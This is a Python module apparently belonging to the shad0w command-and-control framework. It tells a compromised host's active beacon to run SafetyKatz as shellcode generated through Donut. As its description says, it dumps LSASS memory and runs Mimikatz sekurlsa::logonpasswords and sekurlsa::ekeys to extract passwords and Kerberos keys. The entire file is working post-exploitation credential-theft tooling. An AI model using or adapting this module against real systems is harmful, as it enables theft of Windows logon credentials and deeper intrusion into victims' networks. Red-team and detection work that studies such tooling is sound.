#
# Execute safetykatz on a session
#

import argparse

from lib import shellcode

__description__ = "Mini dump LSASS then use Mimikatz sekurlsa::logonpasswords and sekurlsa::ekeys on it"
__author__ = "@_batsec_, @harmj0y"
__type__ = "module"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of safetykatz binary
SAFETYKATZ_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SafetyKatz.exe"


class DummyClass(object):
    # little hack but lets us pass the args to Donut
    def __init__(self):
        pass


def safetykatz_callback(shad0w, data):
    print(data)

    return ""


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    safetykatz_args = ' '.join(args[1:])

    # kind of a hack to make sure we integrate nice with the shellcode generator
    args = DummyClass()

    if len(safetykatz_args) != 0:
        args.param = safetykatz_args
    else:
        args.param = False
        safetykatz_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SAFETYKATZ_BIN, args, safetykatz_args)

    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = safetykatz_callback
